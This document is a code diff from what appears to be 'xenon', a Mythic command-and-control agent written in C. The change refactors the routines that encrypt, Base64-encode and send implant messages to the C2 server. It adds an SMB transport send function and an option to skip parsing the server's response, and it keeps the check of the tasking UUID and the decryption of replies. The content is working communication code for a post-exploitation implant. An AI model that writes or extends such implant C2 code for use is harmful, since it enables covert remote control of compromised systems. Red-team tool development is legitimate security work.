@@ -288,43 +288,36 @@ cleanup:
 }
 
 
-/*
-    Core function for sending C2 messages.
-    - Mythic encryption (true|false)
-    - Base64 encode
-    - C2 profile transforms (using HttpX container for C2)
-    - Base64 decode
-    - Mythic decryption (true|false)
-*/
-BOOL PackageSend(PPackage package, PPARSER response)
+/**
+ * @brief Immediately send a package to the server, ignoring response.
+ */
+BOOL PackageSendNow(PPackage package, PPARSER response)
 {
     BOOL bStatus = FALSE;
-    ////////////////////////////////////////
-    ////////// Send Mythic package /////////
-    ////////////////////////////////////////
-    _dbg("\n\n===================REQUEST======================\n");
 
-    // Mythic AES encryption
-    if (xenonConfig->isEncryption) 
+    if ( xenonConfig->isEncryption ) 
     {
-        if (!CryptoMythicEncryptPackage(package))
+        if ( !CryptoMythicEncryptPackage(package) )
             return FALSE;
     }
 
-    if (!PackageBase64Encode(package)) {
-        _err("Base64 encoding failed");
+    if ( !PackageBase64Encode(package) )
         return FALSE;
-    }
 
     _dbg("Client -> Server message (length: %d bytes)", package->length);
 
     PBYTE pOutData      = NULL;
     SIZE_T sOutLen      = 0;
 
-    if (!NetworkRequest(package, &pOutData, &sOutLen)) {
+#ifdef SMB_TRANSPORT
+
+    if ( !NetworkSmbSend(package, NULL, NULL) )
+    {
         _err("Failed to send network packet!");
         return FALSE;
     }
+
+#endif
 
     // TODO remove comment
     // In the case where SMB receive doesnt return anything
@@ -361,6 +354,7 @@ BOOL PackageSend(PPackage package, PPARSER response)
         goto end;
     }
     
+    
     // Mythic AES decryption
     if (xenonConfig->isEncryption)
     {
@@ -373,9 +367,110 @@ BOOL PackageSend(PPackage package, PPARSER response)
     print_bytes(response->Buffer, response->Length);
     
 
-    // BOOL isDelegates = (BOOL)ParserGetByte(&Response);
-    // _dbg("isDelegates : %s", isDelegates ? "TRUE" : "FALSE");
+    bStatus = TRUE;
 
+end:
+
+    if ( pOutData != NULL )
+    {
+        memset(pOutData, 0, sOutLen);
+        LocalFree(pOutData);
+        pOutData = NULL;
+    }
+
+    return bStatus;
+}
+
+/*
+    Core function for sending C2 messages.
+    - Mythic encryption (true|false)
+    - Base64 encode
+    - C2 profile transforms (using HttpX container for C2)
+    - Base64 decode
+    - Mythic decryption (true|false)
+*/
+BOOL PackageSend(PPackage package, PPARSER response)
+{
+    BOOL bStatus = FALSE;
+    ////////////////////////////////////////
+    ////////// Send Mythic package /////////
+    ////////////////////////////////////////
+    _dbg("\n\n===================REQUEST======================\n");
+
+    // Mythic AES encryption
+    if (xenonConfig->isEncryption) 
+    {
+        if (!CryptoMythicEncryptPackage(package))
+            return FALSE;
+    }
+
+    if ( !PackageBase64Encode(package) ) {
+        _err("Base64 encoding failed");
+        return FALSE;
+    }
+
+    _dbg("Client -> Server message (length: %d bytes)", package->length);
+
+    PBYTE  pOutData      = NULL;
+    SIZE_T sOutLen       = 0;
+    BOOL   IsGetResponse = TRUE;
+
+    if ( response == NULL ) {
+        IsGetResponse = FALSE;
+    }
+
+    if ( !NetworkRequest(package, &pOutData, &sOutLen, IsGetResponse) ) {
+        _err("Failed to send network packet!");
+        return FALSE;
+    }
+
+    // TODO remove comment
+    // In the case where SMB receive doesnt return anything
+    if (pOutData == NULL || sOutLen == 0) {
+        return TRUE;
+    }
+
+    // Sometimes we don't care about the response data (post_response)
+    // Check response pointer for NULL to skip processes the response.
+    if (IsGetResponse == FALSE)
+        goto end;
+
+    // Fill parser structure with data
+    ParserNew(response, pOutData, sOutLen);
+
+    ////////////////////////////////////////
+    ////// Response Mythic package /////////
+    ////////////////////////////////////////
+    _dbg("\n\n===================RESPONSE======================\n");
+    _dbg("Server -> Client message (length: %d bytes)", response->Length);
+ 
+    if (!ParserBase64Decode(response)) {
+        _err("Base64 decoding failed");
+        goto end;
+    }
+
+    // Check payload UUID
+    SIZE_T sizeUuid             = TASK_UUID_SIZE;
+    PCHAR receivedPayloadUUID   = NULL; 
+    receivedPayloadUUID         = ParserGetString(response, &sizeUuid);
+    // Use memcmp to pass a strict size of bytes to compare
+    if (memcmp(receivedPayloadUUID, xenonConfig->agentID, TASK_UUID_SIZE) != 0) {
+        _err("Check-in payload UUID doesn't match what we have. Expected - %s : Received - %s", xenonConfig->agentID, receivedPayloadUUID);
+        goto end;
+    }
+    
+    
+    // Mythic AES decryption
+    if (xenonConfig->isEncryption)
+    {
+        if (!CryptoMythicDecryptParser(response))
+            goto end;
+    }
+
+    
+    _dbg("Decrypted Response");
+    print_bytes(response->Buffer, response->Length);
+    
 
     bStatus = TRUE;
 
